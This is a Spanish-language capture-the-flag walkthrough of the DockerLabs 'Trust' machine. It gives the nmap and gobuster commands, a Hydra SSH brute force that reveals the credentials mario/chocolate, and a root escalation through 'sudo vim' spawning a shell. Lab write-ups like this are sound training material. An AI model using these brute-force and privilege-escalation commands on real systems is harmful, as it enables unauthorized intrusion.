<center>
  <h1>Trust</h1>
  <p>
    <img src="img/banner.png" width="700" alt="Trust Banner">
  </p>
</center>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-DockerLabs-2496ED?style=for-the-badge&logo=docker&logoColor=white">
  <img src="https://img.shields.io/badge/Category-Linux-333333?style=for-the-badge&logo=linux&logoColor=white">
  <img src="https://img.shields.io/badge/Difficulty-Easy-2EA043?style=for-the-badge">
  <img src="https://img.shields.io/badge/Status-Completed-success?style=for-the-badge">
</p>

---

## 📌 Descripción

**Trust** es una máquina de **DockerLabs** orientada a practicar un flujo clásico de pentesting en Linux: reconocimiento de servicios, enumeración web, descubrimiento de credenciales débiles, acceso inicial por SSH y escalada de privilegios mediante una mala configuración de `sudo`.

> [!IMPORTANT]
> Este writeup fue realizado en un entorno controlado. No utilizar estas técnicas sin autorización.

---

## 🎯 Objetivo

Obtener acceso inicial y escalar privilegios hasta **root**.

---

## 🧰 Herramientas

- Nmap  
- Gobuster  
- Hydra  
- SSH  
- Docker  

---

## 🚀 Despliegue

```bash
unzip trust.zip
chmod +x auto_deploy.sh
bash auto_deploy.sh trust.tar
```

---

## 🔎 Reconocimiento

```bash
nmap -sS -p- -sC -sV -Pn 172.18.0.2
```

### Resultado

- 22 → SSH  
- 80 → HTTP  

![nmap](img/nmap.png)

---

## 🌐 Enumeración

```bash
gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirb/common.txt -x php
```

### Hallazgo

- `/secret.php`

![gobuster](img/gobuster.png)

---

## 🕵️ Información obtenida

En `/secret.php` se identifica el usuario:

```
mario
```

---

## 💣 Fuerza bruta

```bash
hydra -l mario -P rockyou.txt 172.18.0.2 ssh
```

### Credenciales

- usuario: mario  
- contraseña: chocolate  

![hydra](img/hydra.png)

---

## 🔓 Acceso inicial

```bash
ssh mario@172.18.0.2
```

---

## ⬆️ Escalada de privilegios

```bash
sudo -l
```

Se detecta uso de `vim` como root.

```bash
sudo vim -c ':!/bin/bash'
```

```bash
whoami
```

```
root
```

---

## 🎯 Resultado

Acceso total al sistema como root.

---

## 🧠 Lecciones

- Enumeración es clave  
- Credenciales débiles siguen siendo críticas  
- sudo mal configurado = root  

---

## 👨‍💻 Autor

Johann Lizana  

<p>
<a href="https://www.linkedin.com/in/johann-lizana-collao/">
<img src="https://img.shields.io/badge/LinkedIn-Johann_Lizana-0077B5?style=for-the-badge&logo=linkedin&logoColor=white">
</a>
</p>
